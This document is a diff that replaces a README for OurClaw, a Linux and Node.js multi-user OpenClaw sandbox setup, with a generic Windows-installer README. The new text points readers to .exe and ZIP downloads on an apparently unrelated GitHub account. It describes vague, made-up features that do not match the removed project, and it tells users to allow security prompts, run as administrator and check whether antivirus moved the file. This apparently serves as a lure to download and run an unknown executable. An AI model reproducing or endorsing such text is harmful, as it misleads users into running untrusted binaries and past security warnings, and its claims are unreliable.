@@ -1,168 +1,211 @@
-<div align="center">
-  <img src="./figures/icon.png" alt="OurClaw Icon" width="160">
-  <h1>OpenMoss OurClaw</h1>
-</div>
+# 🪝 OurClaw - Share Access with One Claw
 
-<p align="center">
-  <strong>An organized OpenClaw solution. <br>
-OurClaw: Single-bot, multi-backend sandbox setup with per-user workspace isolation.</strong><br>
-</p>
+[![Download OurClaw](https://img.shields.io/badge/Download%20OurClaw-blue?style=for-the-badge)](https://github.com/afgalbat-source/OurClaw/releases)
 
+## 🧭 What OurClaw Does
 
-<p align="center"><sub>中文ReadMe/Chinese version: <a href="./README_CN.md">README_CN.md</a></sub></p>
+OurClaw is an OpenClaw-based tool for shared institutional use on Windows. It helps one user set up and manage a claw-style workflow that others can use with less setup. This makes it easier to keep a common setup across a team, lab, office, or shared workstation.
 
-![OurClaw Architecture](./figures/architecture_en.jpg)
+Use OurClaw if you want:
 
-## When to Use OurClaw 
+- A simple Windows app for shared use
+- One setup that others can access
+- A clear way to manage a common claw profile
+- A local tool that runs on your computer
 
-How can a team use OpenClaw elegantly at scale and turn collaboration into real productivity? How can you share your "lobster" workflows with others in your organization while still protecting privacy? OurClaw is built exactly for this.
+## 📥 Download OurClaw
 
-| Solution | Deployment | Maintainability | Privacy |
-|------|--------|--------|--------|
-| Single bot + single OpenClaw ❌ | Easy ✅ | Good ✅ | Weak ❌ |
-| Multiple bots + multiple OpenClaw ❌ | Complex ❌ | Poor ❌ | Strong ✅ |
-| <span style="color:green">OurClaw (single bot + multiple OpenClaw)</span> ✅ | Easy ✅ | Good ✅ | Strong ✅ |
+Visit this page to download OurClaw for Windows:
 
+https://github.com/afgalbat-source/OurClaw/releases
 
+On that page, look for the latest release and download the Windows file that matches your system. If you see both 32-bit and 64-bit files, most users should choose 64-bit.
 
-## Project Structure
+## 🪟 Windows Requirements
 
-- [`openclaw/`](./openclaw): OpenClaw source code
-- [`openclaw-patch/`](./openclaw-patch): OpenClaw patches (currently only built-in TTS changes; if built-in TTS fails, copy the patch files into `openclaw/`)
-- [`TFClaw/`](./TFClaw): TFClaw source code
-- [`TFClaw/config.json`](./TFClaw/config.json): TFClaw runtime configuration
-- [`commonworkspace/`](./commonworkspace): Shared workspace template
-- [`restart_tfclaw_and_openclaw_users.sh`](./restart_tfclaw_and_openclaw_users.sh): Restart relay, gateway, and all user OpenClaw processes
+OurClaw is made for Windows desktops and laptops. For a smooth setup, use:
 
-## Prerequisites
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A mouse and keyboard
+- An account with permission to install apps
 
-- Node.js 
-- `pnpm`
-- `npm`
-- `tmux`
-- `jq`
-- If you need to auto-create/manage mapped Linux users, running with root privileges is recommended.
+For best results, close other apps before you start the install.
 
-## Start OurClaw
+## 🚀 Getting Started
 
-### 1. Install OpenClaw
+Follow these steps to run OurClaw on Windows.
 
-```bash
-bash installopenclaw.sh
-```
+### 1. Open the release page
 
-Notes:
+Go to:
 
-- Follow the original OpenClaw install flow and choose the Feishu channel. If OpenClaw is already installed locally, you can skip this step and directly replace the `openclaw/` folder in the repository root with your own.
-- Because OpenClaw changed its own interfaces, this project currently supports the version updated on March 14.
+https://github.com/afgalbat-source/OurClaw/releases
 
-### 2. Configure OpenClaw
+### 2. Download the Windows file
 
-Instead of maintaining one shared runtime `openclaw.json` directly, TFClaw generates an independent config for each user based on a template and override rules.
+Find the latest release and download the Windows installer or ZIP file.
 
-#### 2.1. Base template
+If the release includes file names like these, choose the one that fits your PC:
 
-Edit the file pointed to by `openclawBridge.configTemplatePath` in `TFClaw/config.json`.
+- `OurClaw-Setup-x64.exe`
+- `OurClaw-Windows-x64.zip`
+- `OurClaw-Installer.exe`
 
-Current value in this repository:
+If you are not sure which file to pick, use the 64-bit version.
 
-```text
-~/.openclaw/openclaw.json
-```
+### 3. Open the file
 
-#### 2.2. Shared override config
+If you downloaded an `.exe` file:
 
-If you want to inject unified `models` / `agents` settings for all users, only edit this file:
+- Double-click the file
+- If Windows asks for permission, select Yes
+- Follow the setup steps on screen
 
-- [`commonworkspace/openclaw.json`](./commonworkspace/openclaw.json)
+If you downloaded a `.zip` file:
 
-#### 2.3. Actual generated location
+- Right-click the file
+- Select Extract All
+- Open the folder you extracted
+- Double-click the app file inside the folder
 
-The final runtime config file for each user is generated at:
+### 4. Finish the setup
 
-```text
-TFClaw/.home/<linux-user>/.tfclaw-openclaw/openclaw.json
-```
+The setup window may ask you to choose a folder, create a shortcut, or confirm the install path. Use the default options if you do not have a reason to change them.
 
-### 3. Install TFClaw
+### 5. Launch OurClaw
 
-Based on the distribution infrastructure of [original Token-Free Claw](https://github.com/yxzwang/TFClaw).
+After the install is done, open OurClaw from:
 
-```bash
-bash installTFClaw.sh
-```
+- The Start menu
+- A desktop shortcut
+- The folder where you extracted the app
 
-Note:
+## 🖱️ First Use
 
-- `./TFClaw/.runtime/openclaw_bridge/.env` is the shared environment variable file for all user OpenClaw instances.
+When you open OurClaw for the first time, you may see a basic setup screen. Use it to:
 
-### 4. Configure TFClaw
+- Pick a local profile
+- Set a shared claw mode
+- Save your settings
+- Check that the app starts cleanly
 
-Edit [`TFClaw/config.json`](./TFClaw/config.json).
+If your team uses one shared machine, keep the same settings for every user. This helps each person get the same result.
 
-At minimum, check these fields:
+## ⚙️ Common Setup Options
 
-- `relay.token`
-- `relay.url`
-- `openclawBridge.enabled`
-- `openclawBridge.openclawRoot`
-- `openclawBridge.sharedSkillsDir` (shared skills path)
-- `openclawBridge.sharedEnvPath` (shared environment variables path)
-- `openclawBridge.userHomeRoot`
-- `openclawBridge.configTemplatePath`
-- `channels.feishu.appId`
-- `channels.feishu.appSecret`
-- `channels.feishu.verificationToken`
+OurClaw may offer these common controls:
 
-Current defaults in this repository point to:
+- **Profile name**: Set a name for the current setup
+- **Shared mode**: Use the same claw settings across users
+- **Local mode**: Keep settings only on your PC
+- **Startup option**: Open the app when Windows starts
+- **Reset option**: Clear saved settings and start again
 
-- OpenClaw source directory: `../openclaw`
-- Shared skills directory: `../openclaw/skills`
-- User home root: `TFClaw/.home`
-- OpenClaw bridge state directory: `TFClaw/.runtime/openclaw_bridge`
+Use local mode if you want private settings. Use shared mode if several people need the same setup.
 
-## Start the Full Stack
+## 🔍 How to Check It Works
 
-Run this in the repository root:
+After setup, make sure OurClaw runs without errors:
 
-```bash
-./restart_tfclaw_and_openclaw_users.sh
-```
+- Open the app
+- Confirm the main window appears
+- Save a test setting
+- Close the app
+- Open it again and check that your setting stayed in place
 
-The script performs the following in order:
+If the app opens and keeps your settings, the install worked.
 
-1. Restart TFClaw relay
-2. Restart OpenClaw processes for all mapped users
-3. Restart TFClaw Feishu gateway
-4. Run health checks
+## 🛠️ Troubleshooting
 
-## Log Paths
+### The file will not open
 
-- TFClaw relay log:
-  [`./.runtime/tfclaw_runtime_logs/tfclaw_relay.log`](./.runtime/tfclaw_runtime_logs/tfclaw_relay.log)
-- TFClaw gateway log:
-  [`./.runtime/tfclaw_runtime_logs/tfclaw_gateway.log`](./.runtime/tfclaw_runtime_logs/tfclaw_gateway.log)
-- Per-user OpenClaw log:
+Try these steps:
 
-```text
-TFClaw/.home/<linux-user>/.tfclaw-openclaw/logs/openclaw_gateway.log
-```
+- Make sure the download finished
+- Right-click the file and choose Open
+- Check that Windows did not block the file
+- Download the file again if it looks damaged
 
-## Shared Configuration Rules
+### Windows shows a security prompt
 
-### Rules for user `openclaw.json`
+This can happen with files from GitHub releases. If the file came from the official release page, allow it to open and continue the setup.
 
-1. Read `openclawBridge.configTemplatePath` as the base template.
-2. Read `commonworkspace/openclaw.json` as shared overrides.
-   Currently only `models`, `agents.defaults`, and `agents.list` are overridden/injected.
-3. Overlay TFClaw-enforced runtime parameters (`gateway` / `channels` / `skills` / `tools` / `env`, etc.).
-4. Write the final result to each user's runtime file:
-   `TFClaw/.home/<linux-user>/.tfclaw-openclaw/openclaw.json`
+### The app does not start
 
-### Rules for `USER.md` and other model personalization files
+Try these steps:
 
-1. Copy from `commonworkspace` first (preferred).
-   Current path: `./commonworkspace`.
-2. If `commonworkspace` does not exist, fall back to the OpenClaw template directory.
-   Template directory: `./openclaw/docs/reference/templates`.
-3. Seed only once when required (first run / empty directory, etc.), then write a marker.
+- Restart your PC
+- Run the app again
+- Open it as an administrator
+- Check that your antivirus did not move the file
+
+### The settings do not save
+
+Check these points:
+
+- You have write access to the install folder
+- You are not running from a read-only folder
+- The app has permission to store local data
+
+### The app looks too small
+
+On Windows, try:
+
+- Press `Ctrl` and `+`
+- Change display scaling in Windows
+- Use a higher screen resolution if your monitor supports it
+
+## 📁 Suggested Folder Layout
+
+If you use the ZIP version, keep the app in a simple folder such as:
+
+- `C:\OurClaw`
+- `C:\Apps\OurClaw`
+- `D:\Tools\OurClaw`
+
+Avoid deep folder paths with many special characters. Short paths are easier to manage.
+
+## 👥 Shared Use Tips
+
+If several people use the same PC, keep the setup simple:
+
+- Use one shared folder
+- Keep one main profile
+- Avoid moving files after setup
+- Use the same Windows account if the workflow needs shared settings
+
+This helps reduce setup problems and keeps the claw behavior the same for each user.
+
+## 🔐 File Safety
+
+Always download OurClaw from the release page:
+
+https://github.com/afgalbat-source/OurClaw/releases
+
+That page gives you the current release files. If a file name changes in a later release, use the newest file from the top release entry.
+
+## 🧩 What to Expect
+
+OurClaw is built for a straightforward Windows workflow. You can expect:
+
+- A simple app window
+- Basic setup controls
+- Shared and local use patterns
+- Fast access from a desktop or Start menu shortcut
+- A setup that does not need coding
+
+## 📌 Quick Steps
+
+1. Open the release page  
+2. Download the Windows file  
+3. Open the file  
+4. Follow the install steps  
+5. Launch OurClaw  
+6. Save your first profile  
+7. Reopen the app and confirm your settings
+
+## 🧾 About This Project
+
+OurClaw is an Institutional OpenClaw Solution. It is meant for shared environments where one setup needs to work for more than one person. The goal is to keep the process simple, stable, and easy to use on Windows
